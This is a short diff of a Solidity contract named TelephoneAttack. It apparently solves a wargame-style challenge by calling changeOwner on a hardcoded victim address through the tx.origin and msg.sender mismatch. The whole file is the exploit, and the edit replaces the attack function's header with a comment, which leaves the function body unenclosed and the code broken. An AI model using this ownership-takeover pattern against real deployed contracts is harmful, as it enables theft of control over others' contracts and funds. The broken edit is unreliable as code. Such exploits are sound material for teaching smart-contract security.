@@ -5,7 +5,7 @@ interface Telephone {
 }
 contract TelephoneAttack {
     address internal immutable victim = 0x8E4fDB4571Eae557aF8311b63AB87aE2a9c57d3A;
-    function attack() public {
+    // exploit tx.origin and msg.sender discrepancy to change the owner of the telephone contract to the attacker's address
         Telephone(victim).changeOwner(msg.sender);
     }
 }
